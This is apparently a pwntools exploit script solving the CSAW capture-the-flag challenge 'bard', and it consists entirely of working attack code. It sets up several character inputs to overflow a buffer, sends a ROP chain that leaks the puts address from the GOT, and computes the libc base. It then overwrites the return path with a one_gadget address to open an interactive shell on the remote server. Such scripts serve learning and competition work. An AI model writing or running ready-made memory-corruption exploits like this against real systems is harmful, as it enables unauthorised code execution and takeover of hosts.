from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
binary = './bard'

bin = ELF(binary)
libc = ELF('./libc-2.27.so')


conn = remote("pwn.chal.csaw.io", 5019)
# conn = remote('127.0.0.1', 4444)
# gdb.attach(target=('127.0.0.1', 1234), gdbscript='''
# break *0x401019
# break *0x401079
# continue
# ''', exe=binary)

print(conn.recvuntil(b"props...\n\n"))

def character(ge, weap, name):
    print(conn.recvuntil(b"evil):\n")) # good or evil
    conn.sendline(ge)
    print(conn.recvlines(3)) # weapon
    conn.sendline(weap)
    print(conn.recvuntil(b"name:\n")) # name
    conn.send(name)

def encounter(choice):
    print(conn.recvuntil(b"Options:\n"))
    print(conn.recvlines(3)) # weapon
    conn.sendline(choice)

pop_rdi_ret = 0x401143
puts_plt = bin.plt["puts"]
puts_got = bin.got["puts"]
main2 = 0x400f7c
# main = 0x40107B

payload = b""
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload += p64(main2)

for _ in range(7):
    character('e', '1', "b")
character('g', '2', p64(0xdeadbeef))
character('e', '1', "abcdefghijk")
character('g', '2', payload)

for _ in range(10):
    encounter('r')
print(conn.recvuntil(b" runs away.\n"))

# Leak LIBC
leak = conn.recvline()[:-1].ljust(8, b'\x00')
puts_got = u64(leak)
libc_base = puts_got - libc.symbols["puts"]
libc_oneshot = libc_base + 0x4f365

# One shot away
payload = p64(libc_oneshot)
for _ in range(7):
    character('e', '1', "b")
character('g', '2', p64(0xdeadbeef))
character('e', '1', "abcdefghijk")
character('g', '2', payload)

for _ in range(10):
    encounter('r')

conn.interactive()
conn.close()